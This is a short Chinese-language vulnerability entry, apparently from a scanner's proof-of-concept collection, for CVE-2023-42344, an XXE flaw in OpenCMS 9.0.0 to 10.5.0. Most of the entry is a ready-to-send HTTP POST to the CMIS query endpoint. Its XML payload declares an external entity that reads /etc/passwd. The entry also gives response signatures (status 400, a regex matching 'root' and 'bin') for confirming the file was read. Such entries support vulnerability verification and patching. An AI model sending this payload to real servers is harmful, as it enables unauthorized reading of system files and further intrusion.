﻿# OpenCMS XXE漏洞

> 更新时间：2023-12-20

> 漏洞编号：CVE-2023-42344

> 漏洞说明：OpenCMS 9.0.0 - 10.5.0 OpenCms 是一个专业级别的开源网站内容管理系统。由于服务端接收和解析了来自用户端的 XML 数据，且未对引用的外部实体进行适当处理，导致容易受到XML外部实体注入（XXE）攻击。

> 漏洞特征：

> 验证脚本：HTTP

```
POST /opencms/cmisatom/cmis-online/query HTTP/1.1
Content-Type: application/cmisquery+xml
Connection: close

<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><cmis:query xmlns:cmis="<http://docs.oasis-open.org/ns/cmis/core/200908/>"><cmis:statement>&test;</cmis:statement><cmis:searchAllVersions>false</cmis:searchAllVersions><cmis:includeAllowableActions>false</cmis:includeAllowableActions><cmis:includeRelationships>none</cmis:includeRelationships><cmis:renditionFilter>cmis:none</cmis:renditionFilter><cmis:maxItems>100</cmis:maxItems><cmis:skipCount>0</cmis:skipCount></cmis:query>
```

> 响应代码特征：400

> 响应内容特征：^(?=.*?root)(?=.*?bin).*?$

> 上传文件定位：


> 验证文件来源：OpenCMS XXE漏洞.poc
